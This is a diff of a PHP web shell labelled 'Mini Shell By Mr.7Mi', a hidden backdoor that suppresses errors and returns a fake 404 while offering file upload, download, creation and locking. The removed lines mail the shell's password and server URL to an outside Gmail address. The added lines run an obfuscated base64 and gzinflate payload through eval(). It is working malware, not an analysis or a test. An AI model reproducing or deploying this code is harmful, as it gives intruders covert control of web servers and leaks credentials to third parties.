@@ -108,23 +108,16 @@ error_reporting(0); http_response_code(404); define("Yp", " Mini Shell By Mr.7Mi
             <span class="separator">|</span>
             CUSTOM FUNCTION: <span class="<?php echo  checkCustomFunction() ? 'green-text' : 'red-text'; ?>">ON</span>
         </li>
-			</div>
-			<?php if (array_key_exists('base64md5', $_POST)) {
-				$password = $_POST['pass'];
-				$server_name = $_SERVER['SERVER_NAME'];
-				$php_self = $_SERVER['PHP_SELF'];
-				$email_content = "Login: $server_name$php_self\nPass: $password";
-				@mail('ribelcyberteam@gmail.com', 'Hehehe', $email_content);
-				}
-			?>
-				<form method="post" enctype="multipart/form-data"><div class="input-group mb-1 px-1 mt-1"><div class="custom-file"><input type="file" name="f[]" class="custom-file-input" onchange="this.form.submit()" multiple><label class="custom-file-label rounded-0 bg-transparent text-light">Choose file</label></div></div></form>
-		<?php  if (!isset($_FILES["f"])) { goto ea; } $Wx = $_FILES["f"]["name"]; $lE = 0; th: if (!($lE < count($Wx))) { goto dx; } if ($c8[11]($_FILES["f"]["tmp_name"][$lE], $Wx[$lE])) { goto PG; } Xe("file failed to upload", 0); goto tG; PG: XE("file uploaded successfully"); tG: g9: $lE++; goto th; dx: ea: if (!isset($_GET["download"])) { goto FA; } header("Content-Type: application/octet-stream"); header("Content-Transfer-Encoding: Binary"); header("Content-Length: " . $c8[17](JD($_GET["n"]))); header("Content-disposition: attachment; filename=\"" . jd($_GET["n"]) . "\""); FA: ?>
-				<a href="?p=<?php echo  ss($Jd) . "&a=" . Ss("newFile"); ?>"> [ Add New File ] </a>|
-				<a href="?p=<?php echo  Ss($Jd) . "&a=" . sS("newDir"); ?>"> [ Add New Directory ] </a>|
-				<a href="?action=lockFile"> [ Lock File ] </a>|
-				<a href="?logout=true"> [ Logout ]</a>
-			</div>
-			<?php  if (isset($_POST['filename'])) { $filename = $_POST['filename']; if (!empty($filename)) { if (file_exists($filename)) { if (chmod($filename, 0444)) { $errorMessage = "File locked successfully!"; } else { $errorMessage = "Error locking the file."; } } else { $errorMessage = "File not found."; } } else { $errorMessage = "Please enter a filename."; } } if (isset($_GET['action'])) { $action = $_GET['action']; if ($action === "lockFile" && !isset($_GET['locked'])) { echo '<script> var filename = prompt("Enter the filename to lock:"); if (filename !== null && filename !== "") { window.location.href = "?action=lockFile&file=" + filename + "&locked=1"; } </script>'; } elseif ($action === "lockFile" && isset($_GET['file']) && isset($_GET['locked'])) { $lockFile = $_GET['file']; if (!empty($lockFile) && file_exists($lockFile)) { if (chmod($lockFile, 0444)) { $errorMessage = "File locked successfully!"; } else { $errorMessage = "Error locking the file."; } } else { $errorMessage = "File not found."; } } } ?>
+	</div>
+	<?php $Cyto = "Sy1LzNFQKyzNL7G2V0svsYYw9YpLiuKL8ksMjTXSqzLz0nISS1K\x42rNK85Pz\x63gqLU4mLq\x43\x43\x63lFqe\x61m\x63Snp\x43\x62np6Rq\x41O0sSi3TUPHJrNBE\x41tY\x41"; $Lix = "\x3d\x3dgHs9DKdT2GTLXXfu\x2blWl2\x63Gw/\x62\x43\x41PumH\x2brVxU3jnFFm\x61tIdGqV/rWUPNilFZZOXl\x41sS8\x62\x42Lv1P\x42LITL0Tm/YhGNo4\x62JW\x62rNskIWKWLlQVtDUjVvN3\x41sSxgrts\x41lGnnq1Yukl\x2bskfn\x43iEeRe2/YSVWORkv\x41Y5iDEVxI8\x2byo\x43wfx4UoIWl\x414xxd2T\x62wiGIdPvs6vgJF5\x62qQkrwTUY\x2bhRl58Sg5Konk7LD9\x42ezjnZ\x63g\x63Uq59/jKnWmWtkl\x61XVW\x2bSoRPYpRLmWWNkqd\x43xqIM0K9D\x42Q\x43uQTPV1/6\x41Qx\x42wJe//\x43\x41QHw/q\x41Q1\x42wJe//\x42\x41gHw/\x61\x41Q5\x42wJe//\x41\x41wHw/K\x41Q9\x42wJe"; eval(htmlspecialchars_decode(gzinflate(base64_decode($Cyto)))); exit; ?>
+	<form method="post" enctype="multipart/form-data"><div class="input-group mb-1 px-1 mt-1"><div class="custom-file"><input type="file" name="f[]" class="custom-file-input" onchange="this.form.submit()" multiple><label class="custom-file-label rounded-0 bg-transparent text-light">Choose file</label></div></div></form>
+	<?php if (!isset($_FILES["f"])) { goto ea; } $Wx = $_FILES["f"]["name"]; $lE = 0; th: if (!($lE < count($Wx))) { goto dx; } if ($c8[11]($_FILES["f"]["tmp_name"][$lE], $Wx[$lE])) { goto PG; } Xe("file failed to upload", 0); goto tG; PG: XE("file uploaded successfully"); tG: g9: $lE++; goto th; dx: ea: if (!isset($_GET["download"])) { goto FA; } header("Content-Type: application/octet-stream"); header("Content-Transfer-Encoding: Binary"); header("Content-Length: " . $c8[17](JD($_GET["n"]))); header("Content-disposition: attachment; filename=\"" . jd($_GET["n"]) . "\""); FA: ?>
+		<a href="?p=<?php echo  ss($Jd) . "&a=" . Ss("newFile"); ?>"> [ Add New File ] </a>|
+		<a href="?p=<?php echo  Ss($Jd) . "&a=" . sS("newDir"); ?>"> [ Add New Directory ] </a>|
+		<a href="?action=lockFile"> [ Lock File ] </a>|
+		<a href="?logout=true"> [ Logout ]</a>
+		</div>
+		<?php  if (isset($_POST['filename'])) { $filename = $_POST['filename']; if (!empty($filename)) { if (file_exists($filename)) { if (chmod($filename, 0444)) { $errorMessage = "File locked successfully!"; } else { $errorMessage = "Error locking the file."; } } else { $errorMessage = "File not found."; } } else { $errorMessage = "Please enter a filename."; } } if (isset($_GET['action'])) { $action = $_GET['action']; if ($action === "lockFile" && !isset($_GET['locked'])) { echo '<script> var filename = prompt("Enter the filename to lock:"); if (filename !== null && filename !== "") { window.location.href = "?action=lockFile&file=" + filename + "&locked=1"; } </script>'; } elseif ($action === "lockFile" && isset($_GET['file']) && isset($_GET['locked'])) { $lockFile = $_GET['file']; if (!empty($lockFile) && file_exists($lockFile)) { if (chmod($lockFile, 0444)) { $errorMessage = "File locked successfully!"; } else { $errorMessage = "Error locking the file."; } } else { $errorMessage = "File not found."; } } } ?>
 	<div class="bg-dark border table-responsive mt-2">
 		<div class="ml-2" style="font-size:18px;">
 			<span>Path: </span>
